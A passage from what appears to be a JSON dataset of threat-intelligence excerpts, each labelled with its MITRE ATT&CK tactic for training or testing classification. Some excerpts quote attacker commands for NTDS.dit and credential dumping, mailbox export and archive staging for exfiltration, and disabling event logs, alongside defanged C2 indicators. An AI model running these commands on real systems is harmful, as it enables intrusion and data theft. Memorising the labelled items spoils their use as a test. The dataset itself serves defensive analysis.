        "input": "Described attack activity: Based on our telemetry, we found that Earth Preta used multiple approaches to exfiltrate sensitive data from the victims. For example, in some cases, we observed that WinRAR and curl (or cURL) were leveraged to collect and transfer data to the threat actor's server. After further investigation, we even found some previously unseen pieces of malware that were used to collect data in a custom-made file format. In the following sections, we share the details of the unique exfiltration toolsets developed by Earth Preta.",
        "output": "exfiltration",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As older ANDROMEDA malware continues to spread from compromised USB devices, these re-registered domains pose a risk as new threat actors can take control and deliver new malware to victims. This novel technique of claiming expired domains used by widely distributed, financially motivated malware can enable follow-on compromises at a wide array of entities. Further, older malware and infrastructure may be more likely to be overlooked by defenders triaging a wide variety of alerts. \nThis is Mandiant's first observation of suspected Turla targeting Ukrainian entities since the onset of the invasion. The campaign's operational tactics appear consistent with Turla's considerations for planning and advantageous positioning to achieve initial access into victim systems, as the group has leveraged USBs and conducted extensive victim profiling in the past. In this case, the extensive profiling achieved since January possibly allowed the group to select specific victim systems and tailor their follow-on exploitation efforts to gather and exfiltrate information of strategic importance to inform Russian priorities. However, we note some \nelements of this campaign that appear to be a departure from historical Turla operations. Both KOPILUWAK and QUIETCANARY were downloaded in succession at various times, which may suggest the group was operating with haste or less concern for operational security, experiencing some aspect of operational deficiency, or using automated tools. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We spotted several techniques the attacker used to evade detection, which we'll break down below. ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor used various techniques to access hashes and credentials of the target hosts.\nT1003.002 OS Credential Dumping: Security Account Manager\nMeterpreter History:\nT1003.003 OS Credential Dumping: NTDS\nDuring a compromise of a host with Sliver, they used the download command to pull back the ntds.dit from the target:\nT1003.006 OS Credential Dumping: DCSync\nMeterpreter History:\nT1558.001 Steal or Forge Kerberos Tickets: Golden Ticket\nMeterpreter History:\nT1552.001 Unsecured Credentials: Credentials In Files\nThe threat actor used the PowerView module Find-InterestingDomainShareFile to search for password files:\nT1552.004  Unsecured Credentials: Private Keys\nIn one instance the threat actor obtained access with Sliver, they then worked to execute a remote script on the affected host:\nA recovered version of this script shows that it uses a clever technique for self propagation on Linux. In addition to disabling UFW and killing several running services, the script then turns to enumerating all the private keys stored on the hosts, parsing all the hosts in the known_hosts files, as well as username associated with any keys found.\nThis information is then used to iterate through each possible combination of enumerated users, hosts, and keys to attempt to move laterally by using SSH to remotely execute the same script on any connections that might be successful.\nThe script and IP serving infrastructure used here have been linked to a botnet referred to as theSysrv-Hellobotnet.This has been noted in various campaigns since at least 2021:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker exfiltrated e-mail data from targeted accounts using the NewMailboxExportRequest command followed by Get-MailboxExport-Request command. In this case, the attacker was only interested in mail received this year. \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"New-MailboxExportRequest -Mailbox foobar@organization.here -ContentFilter {(Received -ge '03/01/2020')} -FilePath '\\\\<MAILSERVER>\\c\\$\\temp\\b.pst'\" \nThe attacker created password-protected archives on the victims' OWA server so that they could be exfiltrated via a simple HTTP request. \nC:\\Windows\\system32\\cmd.exe /C .\\7z.exe a -mx9 -r0 -p[33_char_password]  \"C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Redir.png\"C:\\Temp\\b.pst\nAn example URL for the attacker to collect the exfiltrated data would be: \nhttps://owa.organization.here/owa/auth/Redir.png \nOn disk, this was located at the following path: \n\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ \nVolexity also saw the attacker stage other exfiltration in another folder on the server located here: \n\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\\ \nFinally, the attacker added their own devices as allowed IDs for active sync for a number of mailboxes using Set-CASMailbox: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Set-CASMailbox -Identity <UserID $>$ -ActiveSyncAllowedDeviceIDs $@$ {add $=$ 'XXXXXXXXXXXXX'}\" ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor attempted to evade detection by tampering with security products in some of the devices they got hands-on-keyboard access to. They employed an open-source tool, resorted to PowerShell cmdlets and existing binaries to evade detection, and in some cases, distributed Group Policy Object (GPO) policies to tamper with security products. ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors executed a script named install-proxy.bat, containing the following lines of code:\nThe script creates two directories, then moves files into their respective directories. It first stops and then deletes a task named CacheTask if it exists. It then Creates a schedule task which will call an XML file which then executes CacheTask.bat\nCacheTask.bat is a script that loops the execution of the Fast Reverse Proxy(FRP) binary:\nBelow is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth's Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:\nThe C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:\nThe above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.\nThe threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:\nIn the command line above you can see several options being used:\nAfter running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: When conducting phishing operations, UNC2970 engaged with targets initially over LinkedIn masquerading as recruiters. Once UNC2970 contacts a target, they would attempt to shift the conversation to WhatsApp, where they would continue interacting with their target before sending a phishing payload that masqueraded as a job description. In at least one case, UNC2970 continued interacting with a victim even after the phishing payload was executed and detected, asking for screenshots of the detection. \nThe phishing payloads primarily utilized by UNC2970 are Microsoft Word documents embedded with macros to perform remote-template injection to pull down and execute a payload from a remote command and control (C2). Mandiant has observed UNC2970 tailoring the fake job descriptions to specific targets. \nThe C2 servers utilized by UNC2970 for remote template injection have primarily been compromised WordPress sites, a trend observed in other UNC2970 code families as well as those used by other DPRK groups. At the time of analysis, the remote template was no longer present on the C2, however following this phishing activity, Mandiant identified it beaconing to a C2 associated with PLANKWALK. \nIn the most recent UNC2970 investigation, Mandiant observed the group returning to WhatsApp to engage their targets. This activity overlaps with a recent blog post by MSTIC on operations from ZINC, as well as the previously mentioned Mandiant blog post from July 2022. \nThe ZIP file delivered by UNC2970 contained what the victim thought was a skills assessment test for a job application. In reality, the ZIP contained an ISO file, which included a trojanized version of TightVNC that Mandiant tracks as LIDSHIFT. The victim was instructed to run the TightVNC application which, along with the other files, are named appropriately to the company the victim had planned to take the assessment for. \nStealing the LIGHTSHOW (Part One) - North Korea's UNC2970 | Mandiant | Google In addition to functioning as a legitimate TightVNC viewer, LIDSHIFT contained multiple hidden features. The first was that upon execution by the user, the malware would send a beacon back to its hardcoded C2; the only interaction this needed from the user was the launching of the program. This lack of interaction differs from what MSTIC observed in their recent blog post. The initial C2 beacon from LIDSHIFT contains the victim's initial username and hostname. \nLIDSHIFT's second capability is to reflectively inject an encrypted DLL into memory. The injected DLL is a trojanized Notepad $++$ plugin that functions as a downloader, which Mandiant tracks as LIDSHOT. LIDSHOT is injected as soon as the victim opens the drop down inside of the TightVNC Viewer application. LIDSHOT has two primary functions: system enumeration and downloading and executing shellcode from the C2. \nLIDSHOT sends the following information back to its C2: \nComputer Name   \nProduct name as recorded in the following registry key   \nSOFTWARE\\\\Microsoft\\\\Windows   \nNT\\\\CurrentVersion\\\\ProductName   \nIP address   \nProcess List with User and Session ID associate per proces ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the eighth day of the intrusion, the threat actor moved toward their final objective, deploying ALPHV Ransomware. This started with the threat actor staging two files on the backup server.\n\"setup.exe,\" which was dropped twice, was just the latest ScreenConnect installer the adversary employed during the intrusion. \"BNUfUOmFT2.exe\" was the ransomware binary.\nFirst, they used thexcopyWindows utility to move the ScreenConnect installer across the domain in the root of C$:\nSecond, they remotely ran the installer on hosts using WMI commands:\nThird, they repeated the process, copying the ransomware payload from the backup server to the domain joined hosts in the network.\nFinally, they used this same method to execute the ransomware remotely via WMI:\nOn the remote hosts, the \"WMIPrvSE.exe\" was observed executing the task.\nDuring the ransomware deployment phase, we observed the threat actor deleting all the backups interactively.\nAfter completing the encryption of files, the following note was left on the infected hosts with the call out to review Twitter to associate the group:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: OS Credential Dumping (T1003) ATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001) \nThe actor attempted to extract credentials from the victim in two ways: Accessing the active directory global catalog file ntds.dit and utilizing comsvcs.dll. Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data. By invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process. This is a classic and clever livingoff-the-land binary (LoLBin) tactic that avoids popular credential extraction tools like Mimikatz, which may alert defenders. \nWe also observed attempts to dump the NTDS.dit, which is a database of Active Directory information. Examples of the command-line syntax used in these cases are below. \ncmd.exe /q /c powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q 1> \\\\127.0.0.1\\admin\\$\\__[STRING] 2>&1 \ncmd.exe /q /c powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp_logs' q q 1> \\\\127.0.0.1\\admin\\$\\__[STRING]5 2>&1 \nThe actor also utilized PrintNightmare, a recently published series of vulnerabilities by Microsoft that would allow remote code execution when an improper print spooler performs privileged file operations. This attack vector is notable in the ubiquitous nature of print services in all modern corporate enterprises. Microsoft has recently released a security patch for PrintNightmare - we encourage all enterprises to patch immediately to avoid exploitation. ",
        "output": "credential access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the network traffic, we can identify a data stream pattern that is distinctive to Hancitor malware.\nFirst, the malware performed a lookup of the external IP-address of the infected system (1). This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).\nHancitor then attempted to download additional malware. This included the info-stealer known as \"Ficker Stealer\" (4), for which the DNS traffic corresponds to a recent article posted byBrad. However, in our case, the post infection HTTP traffic of Ficker Stealer was not observed.\nHancitor also attempted to download Cobalt Strike stagers (.bin files) (3), and Cobalt Strike traffic was sent both encrypted and unencrypted (5).\nHancitorvaethemanic[.]com/8/forum.phptembovewinated[.]ru/8/forum.phpprournauseent[.]ru/8/forum.phpCobalt Strike216.250.248[.]88Config:\n162.244.83[.]95Config:\n80.209.242[.]9\nConfig:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the course of doing research, we also managed to get hold of the following tools that the actors behind Operation Tropic Trooper used in an attack: \nHKTL_GETOS: Detects a target system's OS version. [10] \nHKTL_SHARESCAN: Performs the following: \n-pr: Scans for open ports on target systems.   \n-letmein: Scans for saved usernames and passwords on target systems.   \n-arp: Views the Address Resolution Protocol (ARP) on each target system.   \n-netview: Scans target systems for shared resources. \nHKTL_GETOS's OS-version-sniffing routine \nThese hacking tools were possibly remotely downloaded by the attackers onto infected systems. They aided in lateral movement and further intelligence gathering. Data such as credentials saved on infected systems can be stolen via Address Resolution Protocol (ARP) poisoning or main-in-the-middle (MiTM) Layer 2 and passthe-hash attacks. [1112] The stolen credentials allow attackers laterally move throughout a network. The threat actors no longer have to hack their way in, they have the ability to log in as legitimate users. \nBased on the specially crafted documents we were able to gather, Operation Tropic Trooper has been active since 2012. We have seen malware samples from 2011 that behaved the same way and used similar file markers. [13] \nThe following table provides more detailed information on Operation Tropic Trooper's downloader, TROJ_YAHOYAH. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Truebot\nCommunication to the Truebot C2 server at 45.182.189[.]71 began shortly after the execution of the initial access executable. This connection, however, only lasted for around two hours on the beachhead host, and activity ceased after the Cobalt Strike beacon payload was loaded on the host.\nLooking at memory collected from the beachhead host, we can observe the connection to the Truebot command and control server made by Runtimebroker.exe, the renamed executable copied from the initial malware payload.\nFlawed Grace\nThe FlawedGrace malware is unlike any command and control we've covered in previous reports as it uses acustom binary protocolas opposed to the more common usage of application layer protocols like HTTP/s, RDP, or SSH.\nOver the course of the intrusion, the threat actors pivoted to several command and control addresses with times of overlap between several C2 addresses. This activity took place several times over the course of the intrusion.\nAs well as pivoting between command and control servers, the threat actors started communication from various hosts over the course of the intrusion with no host maintaining constant beaconing.\nAs this malware uses a custom protocol, normal indicators like SSL certificate or JA3 were not present.\nTraces of command and control activity were present in memory on several hosts from the beachhead to multiple servers. Most no longer showed the responsible process, but at least one host had an active connection from an injected svchost.exe process to FlawedGrace command and control visible.\nDuring the first day of the intrusion, we observed a network signature hit for RDP tunneling from one of the FlawedGrace command and control servers, but due to no follow-up activity, it would appear that this did not function properly for the threat actors.\nThis likely also explains the removal of the local user account that had been added to the Remote Desktop Users group.\nCobalt Strike\nCobalt Strike, unlike the other two malware families observed, remained in constant communication with its command and control server after the first beacon was loaded until the end of the intrusion.\nWhile the Cobalt Strike command and control stayed active over the intrusion the threat actors did selectively deploy and remove it on hosts with only the beachhead host maintaining beaconing activity for the whole duration.\nCobalt Strike beacon configuration:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1016: System Network Configuration Discovery T1033: System Owner/User Discovery T1057: Process Discovery T1082: System Information Discovery T1083: File and Directory Discovery T1087: Account Discovery \nT1518: Software Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once a threat actor compromises an AWS account, they have a finite amount of time before the account owners detect that they have an issue. In order to stay under the radar, the threat actors deployed resources in non-standard regions. However, they also turned the EC2 instances on and off throughout their time in the environments.\nThere are a couple of reasons why a threat actor might choose to do this. The first reason is to decrease their visibility. On the EC2 instance page in the AWS console, it defaults to showing onlyrunningEC2 instances. Unless a user is actively trying to review non-running EC2 instances, at an initial glance, the new EC2 instances created by the threat actors would be missed once they are placed in a stopped state.\nThe second reason they might choose to do this is that stopping these resources also avoids incurring extra costs in the organization's account. If the organizations have tight notifications around costs, threat actors stopping the resources they created minimizes costs and helps prevent triggering a cost alert, which is another way they could evade defenses.\nOther than creating resources in different regions and stopping the resources they created, the threat actors did not attempt other defense evasion techniques such as stopping CloudTrail logging or disabling GuardDuty.",
        "output": "defense evasion",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met. We then executed the follow on malware manually.\nBazar Loader 14wfa5dfs.exe\nAbout an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.\nShortly after Cobalt Strike was executed, it dropped several Anchor executable files.\nAnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster. Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1003.003: NTDS   \nT1003.006: DCSync   \nT1003.008: /etc/passwd and /etc/shadow   \nT1110.003: Password Spraying   \nT1111: Two-Factor Authentication Interception   \nT1552.001: Credentials In Files   \nT1552.004: Private Keys   \nT1552.006: Group Policy Preferences   \nT1555.005: Password Managers   \nT1558: Steal or Forge Kerberos Tickets   \nT1558.003: Kerberoasting   \nT1606.001: Web Cookies   \nT1606.002: SAML Tokens ",
        "output": "credential access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Persistence modules are based on scheduled tasks and system registry. Mechanisms vary for different OS versions. In the case of old Windows versions like XP, main module events.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled task for itself. For newer operating systems, events.exe creates task.xml as follows: \n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">   \n<RegistrationInfo><Author>Microsoft Corporation</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PTiM</Interval><   \nStopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2010-09-02T16:15:00</StartBoundary><Enabled>true</Enabled></   \nTimeTrigger></Triggers><Actions Context=\"Author\"><Exec><Command>   \n\"C:\\Users\\User\\AppData\\Local\\Microsoft\\Events Cache\\events .exe\"   \n</Command></Exec></Actions></Task> \nThen it creates a Windows scheduled task using the following command: \n1 schtasks.exe /create /TN \\\"Events\\\\CacheTask_\" /XML \\\"t /F\" \nAt the system registry level, modules achieve persistence by adding themselves into the key: \nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit when it finds possible add values to the Winlogon subkey, and in \nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager. All such indicators of comprometation are mentioned in correspondent appendix below. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The actor was observed executing generic system enumeration commands. While these commands are not malicious, when seen together, it can often indicate an unauthorized user is enumerating the system. \nThe actor was seen executing the following commands: \nwhoami   \nping 8.8.8.8   \nTASKLIST /v   \nsc queryex type $:=$ service state $!=$ all   \nwevtutil el   \nSYSTEMINFO   \ndsquery user -limit 100000 \npowershell  -command \"Get-ADUser -Filter \\* -Properties \\* | Out-File C:\\Windows\\Temp\\data\\domain_user.txt -Append\" powershell  -command \"Get-ADComputer -Filter \\* -Properties \\* | Out-File C:\\Windows\\Temp\\data\\domain_pc.txt -Append\" wmic  useraccount list full ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To deploy the VPN connection, Flax Typhoon downloads an executable file for SoftEther VPN from their network infrastructure. The actor downloads the tool using one of several LOLBins, such as the PowerShell Invoke-WebRequest utility, certutil, or bitsadmin. Flax Typhoon then uses the Service Control Manager (SCM) to create a Windows service that launches the VPN connection automatically when the system starts. This could allow the actor to monitor the availability of the compromised system and establish an RDP connection. \nSC create wudfsvz binPath=\"\\\"C:\\WINDows\\ime\\imejp\\conhost.exe\\\"/service\" displayname= \"A Windows Driver Foundation two-User-mode Driver Framework\" depend= Tcpip start= auto \nFlax Typhoon takes several precautions with their VPN connection to make it harder to identify. First, the actor uses a legitimate VPN application that could be found in enterprise environments. As a result, the file itself is almost certain to go undetected by antivirus products. Second, the actor almost always renames the executable file from vpnbridge.exe to conhost.exe or dllhost.exe. These names imitate the legitimate Windows components Console Window Host Process and Component Object Model Surrogate respectively. Third, the actor uses SoftEther's VPN-over-HTTPS operation mode, which uses protocol tunneling to encapsulate Ethernet packets into compliant HTTPS packets and transmit them to TCP port 443. This makes the VPN connection very difficult to differentiate from legitimate HTTPS traffic, which most network security appliances would not block. \nIn cases where Flax Typhoon needs to move laterally to access other systems on the compromised network, the actor uses LOLBins, including Windows Remote Management (WinRM) and WMIC. \nMicrosoft has observed Flax Typhoon routing network traffic to other targeted systems through the SoftEther VPN bridge installed on compromised systems. This network traffic includes network scanning, vulnerability scanning, and exploitation attempts. ",
        "output": "command and control",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.\nThe Cobalt Strike beacons also make use of multiple C2 servers on the public internet.\nCobalt Strike Configs:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: NetSupport\nAs referenced in the Initial Access section, the NetSupport deployment script writes aclient32.inifile to the AppData Roaming path, which specifies the primary and secondary gateway.\nThe primary gateway,npinmclaugh11[.]com:2145, was unsuccessful as it resolved to an IP of127.0.0.127. As a result, all communication was thus routed through the secondary gateway atnpinmclaugh14[.]com:2145.\nNetSupport connections were established on day one to 89.185.85.44 on port 2145; however, on day five of the intrusion, another NetSupportclient32.inifile was deployed to other assets on the network, introducing a new command and control server ofwsus-isv-local[.]tech:133andwsus-isv-internal[.]tech:133.\nThe following table provides a summary of all the domains and IPs used by NetSupport during this incident :\nSSH Tunnelling\nOn day five of this intrusion, two scheduled tasks (\"SSH Server\" and \"SSH Key Exchange\") were created on the beachhead to establish a local SSH server running on port 2222 for remote system 185.206.146.129.\nThe command used to establish the reverse SSH tunnel within the scheduled task is described below:\nBelow diagram depicts this SSH reverse tunnel from the victim network to attacker's VPS.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \"Stolen Image Evidence\" email campaign. https://twitter.com/infosecfu/status/1468955220059168785?s=20&t=_fCNcLM-nx1e8EHbyA6z3A These initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets. The emails contain a link to a legitimate storage service like those offered by Google and Microsoft. In this example, \"http://storage.googleapis.com\" was used to host a zip file. The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file. Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID. Below is a configuration extraction of that initial IcedID malware from anautomated sandbox analysis of the sample:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IP Address:\n45[.]87[.]81[.]184193[.]42[.]33[.]232\nFiles:\n352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For this campaign, thread hijacked emails were used to deliver the malicious HTML file. According to Proofpoint, this campaign was associated to a distribution group they track as TA551. Credits to Proofpoint for the below example.\nAfter downloading and opening the HTML file, it downloaded a password protected ZIP file with a random name. The password to unzip the file was presented to the user.\nThe following image shows the HTML file opened in a browser.\nThe ISO file from the zip, when mounted, had 1 visible LNK file (documents-9771) and 3 hidden files: demurest.cmd, pimpliest_kufic.png and templates544.png.\nAfter execution, a legitimate image is opened to trick the user into thinking nothing is amiss.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After execution, the dropper executable, as shown in Figure 5, uses the AppLockerBypass technique to download and execute the XML content shown below in Figure 15. The XML content contains VBScript code capable of enumerating all running processes and sending the resultant information to a PHP script on a remote host.\nAll process names enumerated are stored in a newline-delimited (Chr(13) and Chr(10)) string object where each line is padded with spaces (Chr(32)). The text list is then transmitted over a HTTP POST to a PHP script hosted at the following location: http://update.upload-dropbox[.]com/docs/tz/GetProcess.php. Note also that the final line of the VBS code in Figure 15 shows a commented-out debug statement to print the response text from POST request. During investigation, the response from the server appeared to be blank.\nFigure 15: XML script logo.ico, containing VBS code, for regsvr32.exe to execute",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After an attacker gains the initial foothold, their next step is to plan and execute the attack.\nThe two most probable avenues for executing an attack in cloud environments are through control plane APIs or data plane APIs.\nIn an on-premises IT infrastructure, administrators typically directly connect to each endpoint  such as a router, a firewall or network-attached storage  to manage each device. In contrast, users rarely directly connect to resources in a cloud environment. Instead, they authenticate with a CSP's API gateway and call a set of control plane APIs to manage cloud resources. This centralized access control is a double-edged sword. It simplifies the access control management, but a leaked credential with high privilege can also be devastating, as every cloud resource may be accessed with the same key.\nControl plane APIsare used for resource management, such as creating/configuring networks, creating/deleting VM instances and reading/writing resource policies.Data plane APIsare used for accessing data inside individual resources  for example, reading/writing files on a virtual machine instance or querying data from a database table.\nUsing the hypothetical examples in theInitial Accesssection, an attacker could gain access to the control plane if cloud credentials are found on acompromised laptoporRDP server. Once the attacker is in possession of a cloud credential with sufficient privileges, the attacker can authenticate with the API gateway and access cloud resources.\nThe attacker may also compromise cloud resources through the data plane. On a compromised laptop, the attacker may find data plane credentials such as VMs' SSH keys or database passwords. From a compromised RDS server exposed to the internet, the attacker may use data plane APIs to search for other vulnerable servers in the same private network or harvest credentials in the environment variables or memory.\nAttackers can move from the data plane to the control plane or vice versa. For example, an attacker who compromises a virtual machine instance through the data plane APIs may find control plane credentials in the instance'smetadata. On the other hand, an attacker who can access virtual machine service through control plane APIs may use features like code execution[1][2] andremote access controlto gain access into a VM instance and attack other hosts from the VM instance through the data plane APIs. In the next section, we will show it is common for attackers to move between the control plane and the data plane to escalate their privileges.\nBest Practices to Limit Execution\nModern cloud-native infrastructure is built with layers of security boundaries, e.g., containers, namespaces, virtual machines, virtual private clouds and account isolation. When possible, create a boundary for each logically separated resource and workload to reduce the impact in case of security accidents.",
        "output": "execution",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the BlackCat attack, logs were disabled on several systems to avoid detection. For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below). \nc:\\windows\\system32\\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false \nThe anti-rootkit tool Gmer was loaded into a small number of key systems. We believe the attackers used this to disable endpoint protection. \nc:\\users\\<username>\\downloads\\gmer\\gmer.exe ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
